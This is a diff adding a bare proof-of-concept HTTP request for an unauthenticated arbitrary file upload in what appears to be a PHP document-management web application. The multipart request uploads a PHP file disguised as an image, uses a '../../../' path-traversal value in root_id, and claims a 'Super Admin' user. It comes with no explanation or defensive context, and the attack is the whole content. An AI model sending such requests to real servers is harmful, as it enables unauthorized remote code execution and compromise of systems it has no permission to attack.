@@ -1,0 +1,60 @@
+Vulnerability Unauthorized arbitrary file upload (SYSTEM)
+POST /index.php/Pan/Upload/upload/clientid/4.html?flag=input HTTP/1.1
+Host: 192.168.5.25:8000
+Content-Length: 1268
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuwEAN6czvjjYmBQL
+Accept: */*
+Origin: http://192.168.5.25:8000
+Referer: http://192.168.5.25:8000/index.php/Pan/Index/doc/root_id/BD8455CA-FA46-33C4-BB7C-58D6F580B82F/clientid/4.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="file"; filename="4.php"
+Content-Type: image/jpeg
+
+<?php phpinfo();?>
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="root_id"
+
+../../../
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="folder_id"
+
+0
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="folder_path_id"
+
+
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="folder_path_name"
+
+
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="dir_path"
+
+[""]
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="user_id"
+
+4
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="user_name"
+
+Super Admin
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="saas_id"
+
+355DF852-7D5B-A37A-6D2D-1FD22DED7A57
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="saas_dbname"
+
+antdbms_default
+------WebKitFormBoundaryuwEAN6czvjjYmBQL
+Content-Disposition: form-data; name="clientid"
+
+4
+------WebKitFormBoundaryuwEAN6czvjjYmBQL--
+
